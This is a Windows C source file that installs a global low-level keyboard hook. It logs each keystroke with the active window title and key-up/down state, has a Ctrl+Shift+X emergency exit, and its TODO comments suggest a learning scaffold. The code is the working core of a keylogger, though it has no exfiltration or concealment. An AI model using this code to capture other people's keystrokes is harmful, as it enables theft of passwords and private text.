// hook.c
#include "hook.h"
#include "logger.h"
#include "util.h"

static HHOOK g_hook = NULL;

int install_keyboard_hook(void) {
    // TODO: install WH_KEYBOARD_LL with SetWindowsHookEx
    // - Save handle in g_hook
    // - Return success/failure
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (g_hook == NULL) {
        return 0; // failure
    }
    return 1; // success
}

void uninstall_keyboard_hook(void) {
    // TODO: unhook with UnhookWindowsHookEx(g_hook)
    UnhookWindowsHookEx(g_hook);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // TODO: Only act when nCode == HC_ACTION
    if (nCode != HC_ACTION) {
        return CallNextHookEx(g_hook, nCode, wParam, lParam);
    }
    // TODO: Cast lParam to KBDLLHOOKSTRUCT*
    KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;

    // TODO: Detect emergency hotkey (Ctrl + Shift + X)
    // TODO: If emergency key pressed: 
    //         - PostQuitMessage(0)
    //         - return 1 or CallNextHookEx
    if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) &&
        (kbdStruct->vkCode == 'X') &&
        (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
        (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
        PostQuitMessage(0);
        return 1; // Block the key event
    }

    // TODO: Convert vkCode → string using util_vkey_to_string()
    wchar_t keyText[32];
    util_vkey_to_string(kbdStruct->vkCode, keyText, sizeof(keyText) / sizeof(wchar_t));
    // TODO: Detect active window changes (call util_get_active_window_title())
    wchar_t windowTitle[256];
    util_get_active_window_title(windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
    // TODO: Pass formatted event into logger_log_key()
    wchar_t keyboardState[64];
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        swprintf(keyboardState, sizeof(keyboardState) / sizeof(wchar_t), L"%ls", L"DOWN");
    else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        swprintf(keyboardState, sizeof(keyboardState) / sizeof(wchar_t), L"%ls", L"UP");
    // else
    //     swprintf(keyboardState, sizeof(keyboardState) / sizeof(wchar_t), L"%ls", L"UNKNOWN");
        
    logger_log_key(windowTitle, keyboardState, keyText);

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}
